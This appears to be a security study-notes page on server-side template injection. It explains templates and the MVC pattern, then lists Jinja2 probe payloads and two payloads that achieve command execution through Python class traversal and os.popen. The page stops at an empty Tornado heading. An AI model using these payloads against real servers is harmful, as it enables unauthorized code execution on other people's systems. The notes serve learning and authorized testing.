---
description: Server-Side Template Injection
---

# SSTI

Server-side template injection can be used for XSS, sensitive information disclosures, and even code execution.

**💡NOTE:**

To understand server-side template injection you must understand templates and to understand templates you must understand the model–view–controller design pattern.

View is used to manipulate the HTML code and is normally implemented using templates.

Templates allow you to have placeholders in your HTML code where you can pass in variables.

* Template engines can do all kinds of things such as calling functions and methods, looping over variables, and arithmetic.
* EX: the expression “\{{Title\}}” will be replaced by whatever argument is passed to the template engine:

```html
  <head>
    <title>{{Title}}</title>
  </head>
```

#### Model–view–controller design pattern

a user initiates a request to the controller -> controller uses the model to gather information from the back-end database -> information is passed back to the controller -> controller passes the information to the view the updated view is passed back to the controller -> sent to the user and rendered in the browser.

<figure><img src="../.gitbook/assets/Screenshot 2023-10-05 211128.png" alt=""><figcaption></figcaption></figure>

## Examples of Template Engines

### <mark style="color:yellow;">1. Python - Jinja 2</mark>

If you find server-side template injection in the Jinja 2 template engine the severity of your finding depends on what python classes you have access to.

**Vulnerable code snippet:**

<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

**Method Resolution Order (MRO):** is the order in which Python looks for a method in a hierarchy of classes.

* For this attack, we only care about the root object class.

**SSTI testing payloads:**

* \{{7\*7\}}        ->  49
* \{{7\*’7’\}}       ->  7777777
* \{{‘’.\_\_class\_\_.\_\_mro\[1]\}}    -> get the root object by the second index in the array.
* \{{\[].\_\_class\_\_.\_\_base\_\_\}}  -> get the root object on an empty array.
* \{{\[].\_\_class\_\_.\_\_mro\[1]\_\_subclasses\_\_()\}}  -> list all the subclasses of a class.

<mark style="color:green;">For Code Execution:</mark>

* \{{\[].\_\_class\_\_.\_\_mro\_\_\[1].\_\_subclasses\_\_()\[-3]\('whoami',shell=True,stdout=-1).communicate()\[0]\}}
* \{{config.\_\_class\_\_.\_\_init\_\_.\_\_globals\_\_\['os'].popen('whoami').read()\}}

### <mark style="color:yellow;">2. Python - Tornado</mark>

